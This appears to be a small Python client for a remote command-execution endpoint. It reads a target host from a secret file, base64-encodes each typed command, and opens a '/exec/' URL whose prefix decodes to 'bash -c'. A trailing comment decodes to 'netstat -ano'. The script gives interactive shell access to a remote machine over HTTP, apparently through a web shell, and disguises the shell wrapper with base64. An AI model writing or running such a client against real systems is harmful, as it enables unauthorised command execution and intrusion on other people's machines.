import base64
import webbrowser

arr = []

host = 'http://127.111.0.1:8080'
with open("host.secret.txt", 'r') as f:
    host = f.read()

pref = f'{host}/exec/'

while True:
    x = input()
    if x:        
        encoded = base64.urlsafe_b64encode(x.encode())
        webbrowser.open(f'{pref}YmFzaA==%20LWM=%20{encoded.decode()}')
        print(f'{pref}YmFzaA==%20LWM=%20{encoded.decode()}')



# bmV0c3RhdA== LWFubw==

